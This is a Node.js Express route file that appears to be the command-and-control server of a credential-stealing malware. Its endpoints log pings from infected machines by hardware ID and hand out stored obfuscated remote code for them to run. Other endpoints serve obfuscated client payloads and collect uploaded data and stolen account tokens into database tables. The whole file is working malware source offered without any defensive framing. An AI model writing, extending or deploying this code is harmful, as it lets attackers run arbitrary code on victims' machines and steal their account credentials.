const { getObfuscatedClientCode, getObfuscatedCode } = require('../../util/obfuscator.js');
const { getShortHwid } = require('../../util/util.js');

const logger = require('../../util/logger');

module.exports = (app) => {
    // pinging / last ping per client
    app.get('/p/:hwid', (req, res) => {
        const hwid = req.params.hwid;
        const newClient = app.lastPings[hwid] == undefined;

        app.lastPings[hwid] = Date.now();
        logger.info(`${getShortHwid(hwid)} has pinged.`);

        if (newClient) app.sockets.forEach((socket) => socket.emit('clientAdded', hwid));
        else app.sockets.forEach((socket) => socket.emit('clientPinged', hwid));

        const result = app.db.prepare('SELECT * FROM saved_rce WHERE hwid = ? AND times_to_run != 0').get(hwid);

        if (result) {
            if (result.times_to_run != -1) app.db.prepare('UPDATE saved_rce SET times_to_run = ? WHERE hwid = ?').run(--result.times_to_run, hwid);
            res.status(200).send(getObfuscatedCode(result.code));
        } else res.status(200).send('');
    });

    // uploading data
    app.post('/d/:hwid', (req, res) => {
        const hwid = req.params.hwid;
        const data = !req.body.data ? 'Empty' : req.body.data;

        app.db.prepare('INSERT INTO data_logs (date, hwid, data) VALUES (?, ?, ?)').run(Date.now(), hwid, data);

        res.status(200).send({});
    });

    // get client code
    app.get('/c/:hwid', (req, res) => {
        logger.info(`Sending client code to ${req.params.hwid}.`);
        res.send(getObfuscatedClientCode());
    });

    // upload token(s)
    app.get('/u/:hwid', (req, res) => {
        const hwid = req.params.hwid;
        let tokens = req.query.t;

        logger.info(`Receiving token(s) from ${hwid}.`);

        // make sure it's sha256 hashed
        if (hwid.length == 64 && tokens != null) {
            try {
                tokens = JSON.parse(tokens);
            } catch (e) {
                logger.info(`Error JSON parsing tokens: ${e}.`);
                logger.info(`Raw: ${req.query.t}`);
                res.status(200).send('');
                return;
            }

            if (tokens.find((t) => JSON.parse(t).token) != null) {
                app.db.prepare('INSERT INTO token_logs (date, hwid, tokens) VALUES (?, ?, ?)').run(Date.now(), hwid, JSON.stringify(tokens));
                logger.info(`Successfuly received token(s) from ${hwid}.`);
            } else {
                logger.info('No token found in keys.');
                logger.info(`Raw: ${req.query.t}`);
            }
        }

        res.status(200).send('');
    });
};
